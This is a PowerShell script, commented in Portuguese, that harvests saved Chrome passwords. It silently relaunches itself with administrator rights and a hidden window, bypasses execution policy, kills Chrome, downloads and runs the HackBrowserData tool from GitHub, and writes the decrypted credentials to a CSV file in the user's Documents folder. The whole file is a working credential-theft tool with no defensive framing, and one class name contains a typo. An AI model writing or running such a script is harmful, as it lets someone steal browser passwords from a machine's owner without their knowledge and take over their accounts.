# ExtrairSenhas.ps1 - Versão com verificação robusta

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Pribcipal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

Write-Host "=== INICIANDO EXTRACAO ===" -ForegroundColor Cyan

# 1. Fecha o Chrome
Write-Host "Fechando Chrome..." -ForegroundColor Yellow
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# 2. Define caminhos sem espaços (usa TEMP raiz, evita problemas)
$tempDir = "C:\Windows\Temp\hbd_temp"
$zipPath = "C:\Windows\Temp\hbd.zip"
$exePath = "$tempDir\hack-browser-data.exe"

# 3. Cria a pasta TEMP
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 4. Baixa o HackBrowserData (versão estável v0.4.6 - mais atual)
Write-Host "Baixando HackBrowserData..." -ForegroundColor Yellow
$hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"

try {
    Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Download concluido!" -ForegroundColor Green
} catch {
    Write-Host "ERRO no download: $_" -ForegroundColor Red
    "ERRO: Falha ao baixar a ferramenta." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    exit
}

# 5. Extrai o arquivo
Write-Host "Extraindo..." -ForegroundColor Yellow
try {
    Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force -ErrorAction Stop
    Write-Host "Extracao concluida!" -ForegroundColor Green
} catch {
    Write-Host "ERRO na extracao: $_" -ForegroundColor Red
    "ERRO: Falha ao extrair a ferramenta." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    exit
}

# 6. Verifica se o EXE existe
if (-not (Test-Path $exePath)) {
    Write-Host "ERRO: Arquivo $exePath nao encontrado!" -ForegroundColor Red
    
    # Tenta encontrar o EXE em qualquer lugar da pasta extraída
    $exeEncontrado = Get-ChildItem -Path $tempDir -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($exeEncontrado) {
        $exePath = $exeEncontrado.FullName
        Write-Host "EXE encontrado em: $exePath" -ForegroundColor Green
    } else {
        "ERRO: Executavel nao encontrado apos extracao." | Out-File -FilePath $arquivoSaida -Encoding UTF8
        exit
    }
}

# 7. Executa a extração (usando & para executar)
Write-Host "Extraindo senhas (pode levar alguns segundos)..." -ForegroundColor Yellow
$outputDir = "$env:TEMP\chrome_data"

try {
    # Executa o comando e captura a saída
    $result = & $exePath -b chrome -f csv --dir $outputDir 2>&1
    Write-Host "Comando executado!" -ForegroundColor Green
    
    # Aguarda o arquivo ser gerado
    Start-Sleep -Seconds 3
    
    # Procura pelo arquivo CSV gerado
    $csvFile = Get-ChildItem -Path $outputDir -Filter "*.csv" -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if ($csvFile -and (Test-Path $csvFile.FullName)) {
        Copy-Item $csvFile.FullName $arquivoSaida -Force
        $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
        Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida ($tamanho KB)" -ForegroundColor Green
    } else {
        Write-Host "Nenhum arquivo CSV foi gerado." -ForegroundColor Red
        "Nenhuma senha encontrada ou erro na extracao." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    }
} catch {
    Write-Host "ERRO ao executar: $_" -ForegroundColor Red
    "ERRO: $($_.Exception.Message)" | Out-File -FilePath $arquivoSaida -Encoding UTF8
}

# 8. Limpeza (opcional - comentado para debug)
# Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
# Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
# Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "Processo concluido!" -ForegroundColor Cyan
Start-Sleep -Seconds 3
exit
